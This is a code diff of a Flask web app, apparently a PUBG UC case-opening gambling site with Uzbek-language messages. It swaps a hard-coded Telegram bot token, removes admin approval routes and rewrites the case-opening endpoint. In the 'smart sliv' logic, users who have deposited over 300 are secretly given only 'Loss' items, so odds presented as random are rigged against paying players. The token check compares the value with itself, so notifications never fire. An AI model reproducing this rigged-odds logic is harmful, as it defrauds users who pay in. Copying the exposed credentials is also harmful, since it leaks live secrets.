@@ -15,12 +15,12 @@ UPLOAD_FOLDER = 'static/checks'
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
-TELEGRAM_BOT_TOKEN = "8253855521:AAEnxN8lQPRQPIWdVcTdv5Wp-bb9Tar1Mys"  
+TELEGRAM_BOT_TOKEN = "8253855521:AAGNmh_BuOSUbF_Z8prnOUJ67sE3EDU2Q2c"  
 ADMIN_TELEGRAM_ID = "8692517241"      
 
 def notify_telegram(message):
     try:
-        if TELEGRAM_BOT_TOKEN != "8253855521:AAEnxN8lQPRQPIWdVcTdv5Wp-bb9Tar1Mys":
+        if TELEGRAM_BOT_TOKEN != "8253855521:AAGNmh_BuOSUbF_Z8prnOUJ67sE3EDU2Q2c":
             url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
             requests.post(url, json={"chat_id": ADMIN_TELEGRAM_ID, "text": message, "parse_mode": "Markdown"})
     except Exception as e:
@@ -270,46 +270,45 @@ def topup_balance():
     conn.commit()
     conn.close()
     
-    notify_telegram(f"🔔 **Yangi to'lov cheki!**\n👤 User: `{user['username']}`\n💰 Summa: `{amount} UC`\n📌 Admin `@JAXONORG` panelni tekshiring.")
+    notify_telegram(f"🔔 **Yangi to'lov cheki!**\n👤 User: `{user['username']}`\n💰 Summa: `{amount} UC`\n📌 Admin panelni tekshiring.")
     return jsonify({"success": True, "msg": "So'rovingiz yuborildi! Admin tasdiqlashini kuting."})
 
-@app.route('/admin')
-def admin_panel():
-    conn = get_db()
-    cursor = conn.cursor()
-    cursor.execute("SELECT payments.*, users.username FROM payments JOIN users ON payments.user_id = users.id ORDER BY payments.id DESC")
-    payments = cursor.fetchall()
-    
-    cursor.execute("SELECT withdraws.*, users.username FROM withdraws JOIN users ON withdraws.user_id = users.id ORDER BY withdraws.id DESC")
-    withdraws = cursor.fetchall()
-    conn.close()
-    return render_template('admin.html', payments=payments, withdraws=withdraws)
-
-@app.route('/admin/approve_payment/<int:pid>', methods=['POST'])
-def approve_payment(pid):
-    conn = get_db()
-    cursor = conn.cursor()
-    cursor.execute("SELECT * FROM payments WHERE id = ?", (pid,))
-    p = cursor.fetchone()
-    
-    if not p or p['status'] == 'completed':
-        conn.close()
-        return jsonify({"success": False, "msg": "Topilmadi yoki bajarilgan!"})
+@app.route('/api/open_case/<case_id>/<int:count>', methods=['POST'])
+def open_case_api(case_id, count):
+    if 'user_id' not in session:
+        return jsonify({"success": False, "msg": "Tizimga kirmagansiz!"})
+    if case_id not in CASES or count not in [1, 5]:
+        return jsonify({"success": False, "msg": "Noto'g'ri so'rov!"})
         
-    cursor.execute("UPDATE users SET balance = balance + ?, total_deposited = total_deposited + ? WHERE id = ?", (p['amount'], p['amount'], p['user_id']))
-    cursor.execute("UPDATE payments SET status = 'completed' WHERE id = ?", (pid,))
-    conn.commit()
-    conn.close()
-    return jsonify({"success": True, "msg": "To'lov tasdiqlandi va balansga qo'shildi!"})
-
-@app.route('/admin/approve_withdraw/<int:wid>', methods=['POST'])
-def approve_withdraw(wid):
+    case = CASES[case_id]
+    total_price = case['price'] * count
+    
     conn = get_db()
     cursor = conn.cursor()
-    cursor.execute("UPDATE withdraws SET status = 'completed' WHERE id = ?", (wid,))
+    cursor.execute("SELECT * FROM users WHERE id = ?", (session['user_id'],))
+    user = cursor.fetchone()
+    
+    if user['balance'] < total_price:
+        conn.close()
+        return jsonify({"success": False, "msg": "Balansingiz yetarli emas!"})
+    
+    cursor.execute("UPDATE users SET balance = balance - ? WHERE id = ?", (total_price, user['id']))
+    
+    won_items = []
+    for _ in range(count):
+        if user['total_deposited'] > 300:
+            loss_items = [it for it in case['items'] if "Loss" in it['name']]
+            won_item = random.choice(loss_items) if loss_items else random.choice(case['items'])
+        else:
+            won_item = random.choice(case['items'])
+        
+        cursor.execute("INSERT INTO inventory (user_id, item_name, item_image, item_price) VALUES (?, ?, ?, ?)",
+                       (user['id'], won_item['name'], won_item['img'], won_item['price']))
+        won_items.append(won_item)
+        
     conn.commit()
     conn.close()
-    return jsonify({"success": True, "msg": "UC chiqarish bajarildi deb belgilandi!"})
+    return jsonify({"success": True, "won_items": won_items, "all_items": case['items']})
 
 @app.route('/api/withdraw_uc', methods=['POST'])
 def withdraw_uc():
@@ -335,39 +334,7 @@ def withdraw_uc():
     conn.commit()
     conn.close()
     notify_telegram(f"📤 **Yangi UC yechish so'rovi!**\n👤 User: `{user['username']}`\n🆔 PUBG ID: `{pubg_id}`\n💎 Miqdor: `{uc_amount} UC`")
-    return jsonify({"success": True, "msg": f"PUBG ID: {pubg_id} ga {uc_amount} UC yechishga yuborildi. Kuting!"})
-
-@app.route('/api/open_case/<case_id>', methods=['POST'])
-def open_case(case_id):
-    if 'user_id' not in session:
-        return jsonify({"success": False, "msg": "Tizimga kirmagansiz!"})
-    if case_id not in CASES:
-        return jsonify({"success": False, "msg": "Case topilmadi!"})
-        
-    case = CASES[case_id]
-    conn = get_db()
-    cursor = conn.cursor()
-    cursor.execute("SELECT * FROM users WHERE id = ?", (session['user_id'],))
-    user = cursor.fetchone()
-    
-    if user['balance'] < case['price']:
-        conn.close()
-        return jsonify({"success": False, "msg": "Balansingiz yetarli emas!"})
-    
-    cursor.execute("UPDATE users SET balance = balance - ? WHERE id = ?", (case['price'], user['id']))
-    
-    # Smart sliv mexanizmi
-    if user['total_deposited'] > 300:
-        loss_items = [it for it in case['items'] if "Loss" in it['name']]
-        won_item = random.choice(loss_items) if loss_items else random.choice(case['items'])
-    else:
-        won_item = random.choice(case['items'])
-    
-    cursor.execute("INSERT INTO inventory (user_id, item_name, item_image, item_price) VALUES (?, ?, ?, ?)",
-                   (user['id'], won_item['name'], won_item['img'], won_item['price']))
-    conn.commit()
-    conn.close()
-    return jsonify({"success": True, "item": won_item})
+    return jsonify({"success": True, "msg": f"PUBG ID: {pubg_id} ga {uc_amount} UC yechishga yuborildi."})
 
 @app.route('/api/activate_promo', methods=['POST'])
 def activate_promo():
